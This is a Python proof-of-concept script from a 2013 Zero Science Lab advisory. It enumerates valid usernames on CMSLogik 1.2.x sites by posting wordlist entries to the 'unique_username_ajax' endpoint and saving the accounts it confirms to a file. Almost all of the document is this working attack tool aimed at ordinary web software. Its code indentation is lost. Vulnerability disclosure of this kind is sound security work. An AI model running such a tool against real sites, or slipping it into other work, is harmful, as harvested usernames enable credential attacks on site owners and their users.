#!/usr/bin/python
#
# CMSLogik 1.2.1 (user param) User Enumeration Weakness
#
#
# Vendor: ThemeLogik
# Product web page: http://www.themelogik.com/cmslogik
# Affected version: 1.2.1 and 1.2.0
#
# Summary: CMSLogik is built on a solid & lightweight framework
# called CodeIgniter, and design powered by Bootstrap. This
# combination allows for greater security, extensive flexibility,
# and ease of use. You can use CMSLogik for almost any niche that
# your project might fall into.
#
# Desc: The weakness is caused due to the 'unique_username_ajax'
# script enumerating the list of valid usernames when some characters
# are provided via the 'user' parameter.
#
# Tested on: Apache/2.2.22
# PHP/5.3.15
#
#
# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
# @zeroscience
#
#
# Advisory ID: ZSL-2013-5137
# Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2013-5137.php
#
#
# 05.04.2013
#
import argparse, sys, json, urllib, urllib2, cookielib
from colorama import Fore, Back, Style, init
init()
print '\n-----------------------------------------------'
print 'User Enumeration Tool v0.1 for CMSLogik 1.2.x'
print 'Copyleft (c) 2013, Zero Science Lab'
print 'by lqwrm'
print '-----------------------------------------------\n'
parser = argparse.ArgumentParser()
parser.add_argument('-t', help='target IP or hostname', action='store', dest='target')
parser.add_argument('-d', help='target dir', action='store', dest='dir')
parser.add_argument('-f', help='username wordlist', action='store', dest='file')
args = parser.parse_args()
if len(sys.argv) != 7:
parser.print_help()
print '\n[*] Example: cmslogik_enum.py -t zeroscience.mk -d cmslogik -f users.txt'
sys.exit()
host = args.target
path = args.dir
fn = args.file
print '\n'
try:
users = open(args.file, 'r')
except(IOError):
print '[!] Error opening \'' +fn+ '\' file.'
sys.exit()
lines = users.read().splitlines()
print '[*] Loaded %d usernames for testing.\n' % len(open(fn).readlines())
users.close()
cj = cookielib.CookieJar()
opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
results = open('validusers.txt', 'w')
for line in lines:
chk_usr = urllib.urlencode({'user' : line})
try:
xhr = json.load(opener.open('http://' +host+ '/' +path+ '/main/unique_username_ajax', chk_usr))
except:
print '[!] Error connecting to http://' +host+ '/' +path
sys.exit()
print '[+] Testing username: ' +Fore.GREEN+line+Fore.RESET
for key, value in xhr.iteritems():
fnrand = value
break
if fnrand == '1':
print '[!] Found ' +Style.BRIGHT+Fore.RED+line+Style.RESET_ALL+Fore.RESET+ ' as valid registered user.'
results.write('%s\n' % line)
results.close()
print '\n[*] Enumeration completed!'
print '[*] Valid usernames successfully written to \'validusers.txt\' file.'
